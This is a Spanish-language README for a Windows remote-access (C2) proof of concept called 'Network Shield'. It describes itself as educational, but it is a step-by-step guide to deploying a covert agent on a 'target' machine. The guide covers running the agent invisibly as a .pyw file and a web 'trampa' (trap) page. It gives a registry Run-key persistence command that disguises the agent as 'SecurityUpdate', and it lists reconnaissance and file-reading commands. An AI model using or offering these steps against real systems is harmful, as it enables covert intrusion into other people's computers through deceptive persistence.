🛡️ Network Shield - Remote Administration System (PoC)
Este proyecto es una Prueba de Concepto (PoC) diseñada para estudiar el funcionamiento de los sistemas de administración remota (C2) y las técnicas de persistencia en entornos Windows.

⚠️ AVISO LEGAL: Este software ha sido creado exclusivamente con fines educativos y de investigación en ciberseguridad. El autor no se hace responsable del mal uso de este código. El uso en sistemas sin autorización es ilegal.

🛠️ Requisitos del Sistema
XAMPP: Servidor Apache y MySQL (MariaDB).

Python 3.x: Instalado en el PATH del sistema.

Librerías: Es necesario tener instalada la librería requests (pip install requests).

Base de Datos: Importar el esquema incluido en el archivo server/db.txt.

🚀 Guía de Instalación y Configuración
1. Preparación de la Base de Datos
Inicia Apache y MySQL desde el panel de XAMPP.

Accede a phpMyAdmin a través de http://localhost/phpmyadmin.

Crea una base de datos llamada network_shield_db.

Importa el contenido de server/db.txt en la pestaña SQL.

2. Configuración del Servidor Web
Mueve la carpeta completa Network-Shield-System a la ruta C:\xampp\htdocs\.

El panel de control será accesible en: http://localhost/Network-Shield-System/server/index.php.

📡 Ejecución y Pruebas
Sigue este orden estricto para establecer el enlace correctamente:

🟢 Paso 1: Iniciar el Receptor (Master)
Abre una terminal en la carpeta master/ y lanza el centro de control ejecutando:
python receptor.py

🔵 Paso 2: Lanzar el Agente (Client)
Ejecuta el script en el equipo objetivo para iniciar la conexión:

Modo Manual: python client/agente.py

Modo Invisible: Renombra el archivo a agente.pyw y ejecútalo.

Simulación Web: Accede desde el navegador a http://localhost/Network-Shield-System/server/trampa.php.

🔐 Implementación de Persistencia
La persistencia permite que el agente se ejecute automáticamente cada vez que el usuario inicie sesión en Windows.

1️⃣ Instalación (Crear Registro)
Envía este comando desde la terminal del receptor para registrar el agente:
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "pythonw.exe C:\xampp\htdocs\Network-Shield-System\client\agente.pyw" /f

2️⃣ Comprobación (Verificar Estado)
Para confirmar que el registro se ha creado correctamente, ejecuta:
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate"

3️⃣ Eliminación (Limpieza del Sistema)
Para desactivar el inicio automático y dejar el sistema limpio, ejecuta:
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f

📂 Estructura del Repositorio
Carpeta server/: Contiene el panel web, la API de reporte y la gestión de comandos.

Carpeta client/: Contiene el script (agente) que se ejecuta en el objetivo de modo invisible.

Carpeta master/: Contiene la terminal C2 interactiva para el administrador.

📋 Comandos de Auditoría Disponibles
Una vez establecida la conexión en el receptor, puedes utilizar:

💻 Información del Sistema: whoami, systeminfo, tasklist, ipconfig.

📂 Gestión de Archivos: dir, cd .., type archivo.txt.

🌐 Interacción Remota: start https://google.com, msg * "Acceso detectado".

🚪 Finalizar Sesión: exit (Cierra la sesión del agente de forma segura).

🛠️ Solución de Problemas (Troubleshooting)
¿No conecta?: Verifica que el puerto 4444 no esté bloqueado por el Firewall de Windows.

¿Agente invisible en la Web?: Asegúrate de que la URL en agente.py coincida exactamente con tu ruta en XAMPP.

¿Error de MySQL?: Verifica que el usuario sea root, la base de datos exista y no tenga contraseña configurada.
